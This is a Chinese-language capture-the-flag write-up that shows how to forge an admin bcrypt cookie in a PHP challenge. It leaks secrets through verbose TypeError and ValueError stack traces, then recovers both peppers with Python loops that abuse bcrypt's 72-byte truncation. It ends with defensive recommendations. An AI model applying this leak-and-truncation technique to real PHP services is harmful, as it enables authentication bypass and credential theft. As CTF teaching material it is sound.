# TSGCTF2024 I Have Been Pwned

## 题目简述

题目运行在 PHP 8.1.31。登录页允许 `guest` 登录，但管理员的新登录被禁用；成功登录后，服务器把下面的拼接结果交给 bcrypt，并把得到的哈希放入 Cookie：

```php
$hash = password_hash(
    $pepper1 . $_POST["auth"] . $_POST["password"] . $pepper2,
    PASSWORD_BCRYPT
);
```

`mypage.php` 对管理员 Cookie 的验证目标则是：

```php
password_verify(
    $pepper1 . "admin" . $admin_password . $pepper2,
    base64_decode($_COOKIE["hash"])
)
```

两个 pepper 均为 16 字节，管理员密码为 15 字节。目标是在不知道这些秘密的情况下伪造一个能通过管理员验证的 bcrypt Cookie。

## 解题过程

### 1. 利用 PHP 异常泄露已知前缀

服务开启了会把异常和调用参数输出到页面的错误显示。首先把 `password` 提交为数组：

```text
auth=admin&password[0]=1
```

`hash_equals($admin_password, $_POST["password"])` 的第二个参数不是字符串，PHP 抛出 `TypeError`，堆栈中直接显示第一个参数：

```text
hash_equals('KeTzkrRuESlhd1V', Array)
```

由此得到完整的 15 字节管理员密码 `KeTzkrRuESlhd1V`。

接着以 guest 身份提交包含空字节的密码。PHP 8.1 的 bcrypt 实现拒绝含空字节的输入，并在 `ValueError` 堆栈中显示传给 `password_hash` 的字符串前缀：

```text
password_hash('PmVG7xe9ECBSgLU...', '2y')
```

因为拼接串以 `pepper1` 开头，这里泄露了 `pepper1` 的前 15 字节 `PmVG7xe9ECBSgLU`。

### 2. 利用 bcrypt 的 72 字节截断恢复 `pepper1`

bcrypt 只使用输入的前 72 字节。以 guest 身份提交 72 个 `a`，服务器设置的 Cookie 哈希实际上只覆盖：

```text
pepper1(16) || "guest"(5) || "a" * 51
```

已知 `pepper1` 的前 15 字节后，只需枚举最后一个字节，并在本地调用 `bcrypt.checkpw`：

```python
for value in range(256):
    candidate = leaked_15 + bytes([value]) + b"guest" + b"a" * 72
    if bcrypt.checkpw(candidate, guest_hash):
        pepper1 = leaked_15 + bytes([value])
        break
```

候选串虽然超过 72 字节，但本地校验和服务器会做相同截断，因此只有正确的末字节能匹配。

### 3. 滑动截断边界逐字节恢复 `pepper2`

完整 guest 输入是：

```text
pepper1 || "guest" || chosen_password || pepper2
```

控制 `chosen_password` 的长度，就能让 bcrypt 的第 72 字节依次落到 `pepper2` 的第 1、2、3 个字节。第一次使用 50 个 `a`，在已知的 16 字节 `pepper1`、5 字节用户名和 50 字节密码之后，截断窗口只包含 `pepper2` 的第一个字节。枚举该字节并与返回的哈希比较即可确定它。随后每轮把 `a` 减少一个，使窗口多覆盖一个 pepper 字节，并把已恢复的前缀放入候选串：

```python
known = b""
for count in range(50, 33, -1):
    guest_hash = request_guest_hash(b"a" * count)
    for value in range(256):
        candidate = pepper1 + b"guest" + b"a" * count + known + bytes([value])
        if bcrypt.checkpw(candidate, guest_hash):
            if value == 0:
                pepper2 = known
                break
            known += bytes([value])
            break
```

这样可恢复 `pepper2 = 8oC7mIiDFw4hQv2e`。

### 4. 生成管理员 Cookie

现在三个秘密都已得到，按验证端的顺序自行计算哈希：

```python
admin_plaintext = pepper1 + b"admin" + admin_password + pepper2
admin_hash = bcrypt.hashpw(admin_plaintext, bcrypt.gensalt())
```

访问 `mypage.php` 时设置：

```text
auth=admin
hash=base64(admin_hash)
```

`password_verify` 接受攻击者自己选择 salt 的合法 bcrypt 字符串，因此不需要伪造服务器原有哈希。页面返回：

```text
TSGCTF{Pepper. The ultimate layer of security for your meals.}
```

## 方法总结

本题把两类缺陷串成完整攻击链：详细 PHP 错误页先泄露秘密前缀，bcrypt 固定 72 字节输入窗口再提供可控的离线比较 oracle。pepper 并不能弥补错误处理和截断语义带来的信息泄露。生产环境应关闭面向用户的详细错误显示，不在堆栈中暴露参数，并在进入 bcrypt 前使用长度固定的密码派生结果；身份 Cookie 也应由服务端会话或带服务端密钥的完整性保护生成，而不是接受任意客户端提供的密码哈希。
